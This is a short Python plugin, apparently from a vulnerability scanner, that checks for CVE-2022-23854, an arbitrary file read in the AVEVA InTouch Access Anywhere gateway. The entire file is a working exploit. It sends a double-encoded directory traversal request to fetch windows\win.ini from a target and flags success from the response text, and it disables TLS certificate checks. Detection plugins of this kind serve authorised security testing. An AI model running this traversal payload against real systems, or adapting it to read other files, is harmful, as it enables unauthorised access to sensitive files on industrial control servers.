#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {
      'links'     :  'https://peiqi.wgpsec.org/wiki/webapp/AVEVA/AVEVA InTouch安全网关 AccessAnywhere 任意文件读取漏洞 CVE-2022-23854.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'AVEVA InTouch安全网关任意文件读取(CVE-2022-23854)漏洞',

      'level'     :   'high',
      
      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/AccessAnywhere/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret